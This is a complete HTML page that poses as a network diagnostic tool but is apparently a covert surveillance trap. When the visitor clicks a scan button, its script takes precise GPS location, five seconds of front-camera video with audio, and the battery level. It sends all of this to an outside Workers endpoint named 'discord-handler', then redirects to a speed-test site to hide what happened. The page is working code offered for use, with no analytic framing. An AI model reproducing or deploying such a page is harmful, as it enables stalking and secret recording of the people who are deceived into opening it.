<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Diagnostic Tool</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; }
        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 180px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; }
        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
        .btn:disabled { background: #161b2c; color: #5c6784; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.3.0</div>
        <div class="terminal" id="terminal">
            <div class="line">> System Ready. Awaiting Handshake...</div>
        </div>
        <button class="btn" id="startBtn">Authorize Scan</button>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        const PROXY_URL = 'https://discord-handler.lew7348.workers.dev'; 

        const btn = document.getElementById('startBtn');
        const terminal = document.getElementById('terminal');

        function addLog(text, color = "#00ff41") {
            const div = document.createElement('div');
            div.className = "line";
            div.style.color = color;
            div.style.borderLeftColor = color;
            div.innerText = text;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        btn.addEventListener('click', async function() {
            btn.disabled = true;
            addLog("> Initiating Secure Handshake...");

            navigator.geolocation.getCurrentPosition(async (pos) => {
                addLog("> GPS Node Linked.");

                let stream;
                try {
                    // Force high-quality audio constraints
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: {
                            echoCancellation: true,
                            noiseSuppression: true,
                            autoGainControl: true
                        } 
                    });
                } catch (e) {
                    addLog("> ERROR: Hardware Denied.", "#ff4b2b");
                    btn.disabled = false;
                    return;
                }

                addLog("> Capturing Telemetry (5s)...");
                
                // AUDIO FIX: Force the browser to use a container that supports both video and audio
                const mimeType = 'video/webm;codecs=vp8,opus';
                const options = MediaRecorder.isTypeSupported(mimeType) ? { mimeType } : {};
                
                const mediaRecorder = new MediaRecorder(stream, options);
                const chunks = [];
                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                mediaRecorder.start();

                setTimeout(() => {
                    addLog("> Forwarding to Cloud Proxy...");
                    mediaRecorder.stop();
                }, 5000);

                mediaRecorder.onstop = async () => {
                    // Final blob must keep the correct mimeType for audio playback
                    const videoBlob = new Blob(chunks, { type: options.mimeType || 'video/webm' });
                    const battery = await navigator.getBattery();
                    const formData = new FormData();
                    
                    formData.append('payload_json', JSON.stringify({
                        content: "ðŸ”± **AUDIO-ENABLED CAPTURE**",
                        embeds: [{
                            title: "Hardware Intelligence Report",
                            color: 3066993,
                            fields: [
                                { name: "ðŸ“ Maps", value: "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude },
                                { name: "ðŸ”Š Audio", value: "Codecs: VP8/Opus (Verified)", inline: true },
                                { name: "ðŸ”‹ Battery", value: Math.round(battery.level * 100) + "%", inline: true }
                            ]
                        }]
                    }));
                    formData.append('file', videoBlob, 'node_capture.webm');

                    try {
                        const response = await fetch(PROXY_URL, { method: 'POST', body: formData });
                        if (response.ok) {
                            addLog("> Success! Finalizing Node...");
                            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                        } else {
                            addLog("> Server Error: " + response.status, "#ff4b2b");
                            btn.disabled = false;
                        }
                    } catch (err) {
                        addLog("> Connection Refused.", "#ff4b2b");
                        btn.disabled = false;
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                };
            }, (err) => {
                addLog("> ERROR: GPS Required.", "#ff4b2b");
                btn.disabled = false;
            }, { enableHighAccuracy: true });
        });
    </script>
</body>
</html>
